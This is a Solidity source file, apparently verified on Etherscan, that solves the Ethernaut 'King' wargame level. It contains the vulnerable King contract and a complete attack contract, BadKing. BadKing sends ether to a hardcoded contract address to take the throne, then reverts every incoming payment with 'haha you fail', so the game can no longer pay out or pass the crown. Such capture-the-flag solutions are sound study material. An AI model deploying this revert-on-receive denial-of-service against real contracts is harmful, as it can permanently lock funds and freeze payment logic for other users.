/**
 *Submitted for verification at Etherscan.io on 2022-03-24
*/

// SPDX-License-Identifier: MIT
pragma solidity ^0.6.0;

// import "@openzeppelin/contracts/ownership/Ownable.sol";

contract King {
    address payable king;
    uint256 public prize;
    address payable public owner;

    constructor() public payable {
        owner = msg.sender;
        king = msg.sender;
        prize = msg.value;
    }

    receive() external payable {
        require(msg.value >= prize || msg.sender == owner);
        king.transfer(msg.value);
        king = msg.sender;
        prize = msg.value;
    }

    function _king() public view returns (address payable) {
        return king;
    }
}


contract BadKing {
    King public king = King(0xc36534267bA5059F8a0379616ACcac41B6AEb4fD);

    // Create a malicious contract and seed it with some Ethers
    constructor() public payable {
        require(msg.value == 0.01 ether);
    }

    // This should trigger King fallback(), making this contract the king
    function becomeKing() public {
        address(king).transfer(address(this).balance);
    }

    // This function fails "king.transfer" trx from Ethernaut
    fallback() external payable {
        revert("haha you fail");
    }
}